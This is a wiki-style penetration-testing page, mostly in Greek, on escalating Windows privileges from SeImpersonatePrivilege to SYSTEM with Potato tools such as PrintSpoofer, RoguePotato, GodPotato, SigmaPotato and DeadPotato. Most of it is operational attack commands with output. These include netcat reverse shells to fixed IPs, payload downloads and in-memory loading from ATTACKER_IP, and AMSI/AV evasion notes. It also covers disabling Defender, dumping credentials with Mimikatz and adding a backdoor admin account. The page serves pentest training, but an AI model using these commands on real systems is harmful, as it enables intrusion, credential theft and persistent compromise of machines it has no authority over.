# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** στο Windows Server 2019 και στο Windows 10 build 1809 και μετά. Ωστόσο, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** μπορούν να χρησιμοποιηθούν για να αξιοποιήσουν τα ίδια προνόμια και να αποκτήσουν πρόσβαση επιπέδου `NT AUTHORITY\SYSTEM`.** Αυτό το [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) εμβαθύνει στο εργαλείο `PrintSpoofer`, το οποίο μπορεί να χρησιμοποιηθεί για κατάχρηση των impersonation privileges σε hosts Windows 10 και Server 2019 όπου το JuicyPotato δεν λειτουργεί πλέον.

> [!TIP]
> Μια σύγχρονη εναλλακτική που συντηρείται συχνά το 2024–2025 είναι η SigmaPotato (ένα fork του GodPotato) που προσθέτει χρήση in-memory/.NET reflection και εκτεταμένη υποστήριξη OS. Δείτε σύντομη χρήση παρακάτω και το repo στις References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Απαιτήσεις και κοινές παγίδες

Όλες οι παρακάτω τεχνικές βασίζονται στην κατάχρηση μιας υπηρεσίας με δυνατότητα impersonation που τρέχει με προνόμια, από ένα context που κατέχει ένα από τα παρακάτω δικαιώματα:

- SeImpersonatePrivilege (πιο συχνό) ή SeAssignPrimaryTokenPrivilege
- Δεν απαιτείται υψηλό επίπεδο ακεραιότητας αν το token έχει ήδη SeImpersonatePrivilege (τυπικό για πολλούς service accounts όπως IIS AppPool, MSSQL, κ.λπ.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Σημειώσεις λειτουργίας:

- Αν το shell σας τρέχει με περιορισμένο token που δεν έχει SeImpersonatePrivilege (συνηθισμένο για Local Service/Network Service σε ορισμένα περιβάλλοντα), ανακτήστε τα προεπιλεγμένα προνόμια του λογαριασμού χρησιμοποιώντας FullPowers, και μετά τρέξτε ένα Potato. Παράδειγμα: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- Το PrintSpoofer χρειάζεται την υπηρεσία Print Spooler να τρέχει και να είναι προσβάσιμη μέσω του τοπικού RPC endpoint (spoolss). Σε σκληραγωγημένα περιβάλλοντα όπου ο Spooler είναι απενεργοποιημένος μετά το PrintNightmare, προτιμήστε RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- Το RoguePotato απαιτεί έναν OXID resolver προσβάσιμο στο TCP/135. Αν το egress είναι μπλοκαρισμένο, χρησιμοποιήστε έναν redirector/port-forwarder (βλέπε παράδειγμα παρακάτω). Παλαιότερες builds χρειάζονταν το flag -f.
- Το EfsPotato/SharpEfsPotato εκμεταλλεύονται το MS-EFSR· αν ένας pipe είναι μπλοκαρισμένος, δοκιμάστε εναλλακτικούς pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Το Error 0x6d3 κατά την RpcBindingSetAuthInfo συνήθως υποδηλώνει έναν άγνωστο/μη υποστηριζόμενο RPC authentication service· δοκιμάστε διαφορετικό pipe/transport ή βεβαιωθείτε ότι η στοχευόμενη υπηρεσία τρέχει.
- Forks τύπου “kitchen-sink” όπως το DeadPotato συσκευάζουν επιπλέον payload modules (Mimikatz/SharpHound/Defender off) που αγγίζουν δίσκο· αναμένεται υψηλότερη ανίχνευση από EDR σε σύγκριση με τα slim originals.

## Γρήγορη επίδειξη

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Σημειώσεις:
- Μπορείτε να χρησιμοποιήσετε -i για να spawn ένα interactive process στο current console, ή -c για να τρέξετε ένα one-liner.
- Απαιτεί την υπηρεσία Spooler. Αν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Εάν η εξερχόμενη θύρα 135 είναι αποκλεισμένη, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato είναι ένα νεότερο COM abuse primitive που κυκλοφόρησε στα τέλη του 2022 και στοχεύει την υπηρεσία **PrintNotify** αντί για Spooler/BITS. Το εκτελέσιμο δημιουργεί τον PrintNotify COM server, αντικαθιστά ένα ψεύτικο `IUnknown`, και στη συνέχεια πυροδοτεί μια προνομιακή κλήση επιστροφής μέσω του `CreatePointerMoniker`. Όταν η υπηρεσία PrintNotify (τρέχει ως **SYSTEM**) συνδεθεί πίσω, η διεργασία αντιγράφει το επιστρεφόμενο token και ξεκινάει το παρεχόμενο payload με πλήρη προνόμια.

Key operational notes:

* Λειτουργεί σε Windows 10/11 και Windows Server 2012–2022 εφόσον η υπηρεσία Print Workflow/PrintNotify είναι εγκατεστημένη (παρουσιάζεται ακόμα και όταν ο legacy Spooler είναι απενεργοποιημένος μετά το PrintNightmare).
* Απαιτεί το calling context να διαθέτει **SeImpersonatePrivilege** (τυπικό για λογαριασμούς IIS APPPOOL, MSSQL και scheduled-task service accounts).
* Δέχεται είτε μια άμεση εντολή είτε διαδραστική λειτουργία ώστε να παραμείνετε στην αρχική κονσόλα. Παράδειγμα:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Επειδή είναι αποκλειστικά βασισμένο σε COM, δεν απαιτούνται named-pipe listeners ή εξωτερικοί redirectors, γεγονός που το καθιστά drop-in replacement σε hosts όπου ο Defender μπλοκάρει το RPC binding του RoguePotato.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Συμβουλή: Αν ένα pipe αποτύχει ή το EDR το μπλοκάρει, δοκιμάστε τα άλλα υποστηριζόμενα pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν υπάρχει το SeImpersonatePrivilege.
- Κατέβασε το binary που αντιστοιχεί στο εγκατεστημένο runtime (π.χ., `GodPotato-NET4.exe` σε σύγχρονο Server 2022).
- Αν το αρχικό execution primitive είναι webshell/UI με σύντομα timeouts, stage το payload ως script και ζήτα από το GodPotato να το εκτελέσει αντί για μια μεγάλη inline εντολή.

Γρήγορο πρότυπο staging από writable IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν service DCOM objects τα οποία από προεπιλογή έχουν RPC_C_IMP_LEVEL_IMPERSONATE. Build or use the provided binaries and run your command:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ενημερωμένο GodPotato fork)

Η SigmaPotato προσθέτει σύγχρονες βελτιώσεις, όπως in-memory execution μέσω .NET reflection και ένα βοηθητικό για PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Ενσωματωμένη σημαία reverse shell `--revshell` και κατάργηση του ορίου 1024 χαρακτήρων του PowerShell, ώστε να μπορείτε να στέλνετε μακριά AMSI-bypassing payloads μονομιάς.
- Σύνταξη φιλική στη reflection (`[SigmaPotato]::Main()`), καθώς και μια βασική μέθοδος παράκαμψης AV μέσω `VirtualAllocExNuma()` για να μπερδέψει απλές ευριστικές.
- Ξεχωριστό `SigmaPotatoCore.exe` μεταγλωττισμένο για .NET 2.0 για περιβάλλοντα PowerShell Core.

### DeadPotato (ανασχεδιασμός GodPotato 2024 με modules)

Το DeadPotato διατηρεί την αλυσίδα OXID/DCOM impersonation του GodPotato αλλά ενσωματώνει βοηθήματα post-exploitation ώστε οι operators να μπορούν άμεσα να αποκτήσουν SYSTEM και να κάνουν persistence/collection χωρίς πρόσθετα εργαλεία.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — εκτελεί αυθαίρετη εντολή ως SYSTEM.
- `-rev <ip:port>` — γρήγορο reverse shell.
- `-newadmin user:pass` — δημιουργεί έναν τοπικό admin για persistence.
- `-mimi sam|lsa|all` — ρίχνει και τρέχει Mimikatz για dump credentials (αγγίζει τον δίσκο, πολύ θορυβώδες).
- `-sharphound` — τρέχει SharpHound συλλογή ως SYSTEM.
- `-defender off` — απενεργοποιεί την προστασία σε πραγματικό χρόνο του Defender (πολύ θορυβώδες).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Επειδή συνοδεύεται από επιπλέον binaries, αναμένετε περισσότερα AV/EDR flags· χρησιμοποιήστε τα πιο ελαφριά GodPotato/SigmaPotato όταν η διακριτικότητα έχει σημασία.

## Αναφορές

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
